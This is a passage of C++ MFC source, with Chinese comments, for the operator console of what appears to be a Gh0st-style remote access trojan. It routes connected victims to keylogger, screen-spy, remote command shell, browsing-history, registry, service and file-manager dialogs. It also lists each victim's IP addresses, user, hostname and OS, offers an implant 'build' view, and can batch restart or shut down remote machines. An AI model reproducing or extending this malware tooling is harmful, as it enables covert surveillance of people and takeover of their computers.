	case TOKEN_PSLIST:     // 系统管理 进程列表
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:// 键盘记录
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVICE_LIST://服务管理
		g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:   //注册表管理    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_XLIST://浏览记录
		g_pFrame->PostMessage(WM_OPENURLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: //开始CMD
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}


// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

 	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	// 交给窗口处理
// 	if (pContext->m_Dialog[0] > 0)
// 	{
// 		switch (pContext->m_Dialog[0])
// 		{
// 		case SCREENSPY_DLG:
// 			((CSpyDlg *)dlg)->OnReceive();
// 			break;
// 		default:
// 			break;
// 		}
// 		return;
// 	}
}



LRESULT CMainFrame::OnAddToList(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;

	CString str,strOS,strIP,strMem,strUser,strCPU,strGroup;
	try
	{
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();


		//以下是添加到命令广播里的列表控件
		//ID	
		int nCnt = g_pInfoDlg->m_list_info.GetItemCount();
		str.Format("%d", nCnt++);	
		int i = g_pInfoDlg->m_list_info.InsertItem(nCnt, str, 15);


		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";		

		g_pInfoDlg->m_list_info.SetItemText(i, 1, IPAddress);

		// 内网IP
		g_pInfoDlg->m_list_info.SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		//登录用户
		strUser.Format("%s",LoginInfo->szUser);
		g_pInfoDlg->m_list_info.SetItemText(i, 3, strUser);

		// 内存大小
		strMem.Format("%.2fGB",(float)LoginInfo->dwMemSize/1024);
		g_pInfoDlg->m_list_info.SetItemText(i, 4, strMem);

		// CPU
		g_pInfoDlg->m_list_info.SetItemText(i, 5, LoginInfo->CPUClockMhz);

		// 主机名
		g_pInfoDlg->m_list_info.SetItemText(i, 6, LoginInfo->HostName);

		// 系统
		strOS.Format("%s",LoginInfo->szOS);
		if(LoginInfo->bIsWow64)	strOS += " (64位操作系统)";
		g_pInfoDlg->m_list_info.SetItemText(i, 7, strOS);

		// 指定唯一标识
		g_pInfoDlg->m_list_info.SetItemData(i, (DWORD) pContext);

		// 上线分组
		strGroup.Format(_T("%s"),LoginInfo->UpGroup);
		if(strGroup.GetLength()==0)
			strGroup = _T("默认分组");

		 // 写入分组
		HTREEITEM hGroupItem = g_pGroupDlg->AddToGroup(strGroup);
		 // 写入主机
		HTREEITEM hChildItem = g_pGroupDlg->m_tree_group.InsertItem(LoginInfo->HostName, hGroupItem);

		// 设置上线图标
		g_pGroupDlg->m_tree_group.SetItemImage(hChildItem, 2,2);

		// 写入上线主机标记
		g_pGroupDlg->m_tree_group.SetItemData(hChildItem,(DWORD) pContext);  


	}catch(...){}

	return 0;
}

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;

	HTREEITEM hGroupItem = NULL; //分组结点
	HTREEITEM hChildItem = NULL; //主机结点

	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = g_pInfoDlg->m_list_info.GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)g_pInfoDlg->m_list_info.GetItemData(i))
			{
				g_pInfoDlg->m_list_info.DeleteItem(i);
				break;
			}		
		}

		HTREEITEM hItem=g_pGroupDlg->m_tree_group.GetRootItem(); //获取根节点
		hGroupItem=g_pGroupDlg->m_tree_group.GetChildItem(hItem);//从子结点开始查找Context相同的结点将其删除
		while(hGroupItem != NULL)//查找分组
		{
           hChildItem = g_pGroupDlg->m_tree_group.GetChildItem(hGroupItem);
		   while(hChildItem != NULL)//查找主机
		   {
			   if (pContext == (ClientContext *)g_pGroupDlg->m_tree_group.GetItemData(hChildItem))
			   {
				   HTREEITEM hItemParent = g_pGroupDlg->m_tree_group.GetParentItem(hChildItem);
				   CString strTitle = g_pGroupDlg->m_tree_group.GetItemText(hItemParent);//从树形控件读取分组名
				   int i = strTitle.Find(_T("("));
				   strTitle = strTitle.Left(i);//取分组名

				   //删除主机及分组
				   g_pGroupDlg->m_tree_group.DeleteItem(hChildItem);//删除主机
				   g_pGroupDlg->m_tree_group.SetItemData(hItemParent, g_pGroupDlg->m_tree_group.GetItemData(hItemParent)-1);//改写分组内主机数量
				   if(g_pGroupDlg->m_tree_group.GetItemData(hItemParent) == 0&& strTitle.Find(_T("默认分组"))==-1)
				   {
					   g_pGroupDlg->m_tree_group.DeleteItem(hItemParent);//删除分组
					   g_pGroupDlg->m_nCount -= 1;                       //分组数量减1
					   break;
				   }
				   else
				   {
					   //重置分组显示
					   strTitle.Format(_T("%s(%d)"),strTitle ,g_pGroupDlg->m_tree_group.GetItemData(hItemParent));//将主机数量加在数组名后
					   g_pGroupDlg->m_tree_group.SetItemText(hItemParent, strTitle);
				   }
			   }

			   hChildItem = g_pGroupDlg->m_tree_group.GetNextItem(hChildItem,TVGN_NEXT); //遍历下一主机
		   }

		   hGroupItem = g_pGroupDlg->m_tree_group.GetNextItem(hGroupItem,TVGN_NEXT); //遍历下一分组
		}

		// 关闭相关窗口
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
		case FILEMANAGER_DLG:
		case SYSTEM_DLG:
		case KEYBOARD_DLG:
		case SERVICE_DLG:
		case REGEDIT_DLG:
		case URL_DLG:
			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			pContext->m_Dialog[0]=0;
			pContext->m_Dialog[1]=0;
			break;
		default:
			break;
		}
 	}catch(...){}

	return 0;
}


LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_FILEMANAGER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}


LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_SERVICE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVICE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //注册表
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);

	//设置父窗口为卓面
	dlg->Create(IDD_DLG_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenUrlDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CUrlDlg	*dlg = new CUrlDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_URLHISTORY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = URL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_DLG_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


// void CMainFrame::OnManagerHideall()
// {
// 	CXTPDockingPaneInfoList& lstPanes = m_paneManager.GetPaneList();
// 	POSITION pos = lstPanes.GetHeadPosition();
// 	while (pos)
// 	{
// 		CXTPDockingPane* pPane = lstPanes.GetNext(pos);
// 		if (!pPane->IsHidden())
// 			pPane->Close();
// 	}
// }
// 
// void CMainFrame::OnManagerShowall()
// {
// 	CXTPDockingPaneInfoList& lstPanes = m_paneManager.GetPaneList();
// 	POSITION pos = lstPanes.GetHeadPosition();
// 	while (pos)
// 	{
// 		CXTPDockingPane* pPane = lstPanes.GetNext(pos);
// 		if (pPane->IsClosed())
// 			m_paneManager.ShowPane(pPane);
// 	}
// }

void CMainFrame::OnFileUser()
{
	// TODO: 在此添加命令处理程序代码
	if (GetActiveView()->IsKindOf(RUNTIME_CLASS(CInfoDlg))) 
		return; 


	SwitchToForm(IDD_DLG_INFO); 
//	OnManagerShowall();
}

void CMainFrame::OnFileBuild()
{
	// TODO: 在此添加命令处理程序代码
	if (GetActiveView()->IsKindOf(RUNTIME_CLASS(CBuildDlg))) 
		return; 

	SwitchToForm(IDD_DLG_BUILD); 
//	OnManagerHideall();
}


// 重启程序 
void CMainFrame::OnReboot()  
{  
	// TODO: 在此添加控件通知处理程序代码  
	::PostMessage(AfxGetMainWnd()->m_hWnd,WM_SYSCOMMAND,SC_CLOSE,NULL);  
	//获取exe程序当前路径  
	TCHAR szAppName[MAX_PATH];  
	:: GetModuleFileName(NULL, szAppName, MAX_PATH);  
	CString strAppFullName;  
	strAppFullName.Format(_T("%s"),szAppName);  
	//重启程序  
	STARTUPINFO StartInfo;  
	PROCESS_INFORMATION procStruct;  
	memset(&StartInfo, 0, sizeof(STARTUPINFO));  
	StartInfo.cb = sizeof(STARTUPINFO);  
	::CreateProcess(  
		(LPCTSTR)strAppFullName,  
		NULL,  
		NULL,  
		NULL,  
		FALSE,  
		NORMAL_PRIORITY_CLASS,  
		NULL,  
		NULL,  
		&StartInfo,  
		&procStruct);  
}  

void CMainFrame::OnFileSetting()
{
	// TODO: 在此添加命令处理程序代码
	UpdateData(TRUE);

	CInputDialog dlg;
	dlg.Init(_T("设置公司名称"), _T("请输入公司名称:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	((CClientApp *)AfxGetApp())->m_IniFile.SetString(_T("Setting"), _T("CompanyName"),dlg.m_str);

	MessageBox(_T("完成设置,客户端将自动重启"),_T("提示"), MB_ICONWARNING);
    
 	OnReboot();

}

void CMainFrame::OnBatchLogout()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolLogout();
}

void CMainFrame::OnBatchRestart()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolRestart();
}

void CMainFrame::OnBatchShut()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolShut();
}


void CMainFrame::OnBatchSelectAll()
{
	// TODO: 在此添加命令处理程序代码 
	m_paneGroup.GetDlgItem(IDC_TREE_GROUP)->SetFocus(); 
	m_paneGroup.m_tree_group.SelectAll(TRUE);
}

void CMainFrame::OnBatchUnselect()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.GetDlgItem(IDC_TREE_GROUP)->SetFocus(); 
	m_paneGroup.m_tree_group.SelectAll(FALSE);
}


void CMainFrame::OnListFile()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolFile();
}

void CMainFrame::OnListPm()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolPm();
}

void CMainFrame::OnListSystem()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolSystem();
}

void CMainFrame::OnListService()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolService();
}

void CMainFrame::OnListSysinfo()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolSysinfo();
}

void CMainFrame::OnListKeyboard()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolKeyboard();
}

void CMainFrame::OnListRegedit()
{
	// TODO: 在此添加命令处理程序代码
	m_paneGroup.OnToolRegedit();
}

void CMainFrame::OnListBatch()
{
	// TODO: 在此添加命令处理程序代码
}



void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CXTPFrameWnd::OnTimer(nIDEvent);
}
